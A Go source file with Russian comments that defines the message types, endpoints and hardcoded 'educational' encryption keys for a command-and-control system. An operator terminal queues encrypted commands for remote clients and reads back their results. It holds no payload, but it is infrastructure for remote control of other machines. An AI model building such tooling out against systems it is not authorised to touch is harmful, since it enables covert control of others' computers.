// Package protocol содержит общие для всех компонентов константы,
// ключи шифрования и DTO для HTTP-обмена.
package protocol

import "errors"

// Ключи симметричного шифрования (учебные, зашиты в код).
var (
	KeyTerminalToC2 = []byte("0123456789abcdef0123456789abcdef")
	KeyC2ToClient   = []byte("fedcba9876543210fedcba9876543210")
)

// HTTP-эндпоинты C2.
const (
	EndpointSubmit = "/api/submit"
	EndpointStatus = "/api/status"
	EndpointList   = "/api/clients"
)

// Статусы задач.
const (
	StatusPending = "pending"
	StatusDone    = "done"
	StatusError   = "error"
)

// SubmitRequest — тело POST-запроса от терминала.
type SubmitRequest struct {
	ClientID string `json:"client_id"`
	Command  string `json:"command"` // base64(зашифрованная команда)
}

// SubmitResponse — ответ C2 с присвоенным ID задачи.
type SubmitResponse struct {
	TaskID string `json:"task_id"`
}

// StatusResponse — ответ на запрос статуса задачи.
type StatusResponse struct {
	TaskID string `json:"task_id"`
	Status string `json:"status"`
	Result string `json:"result,omitempty"`
}

// ClientInfo — информация о клиенте для терминала.
type ClientInfo struct {
	ClientID string `json:"client_id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
	LastSeen string `json:"last_seen"`
}

// Ошибки валидации.
var (
	ErrEmptyClientID = errors.New("client_id is required")
	ErrEmptyCommand  = errors.New("command is required")
	ErrEmptyTaskID   = errors.New("task id is required")
)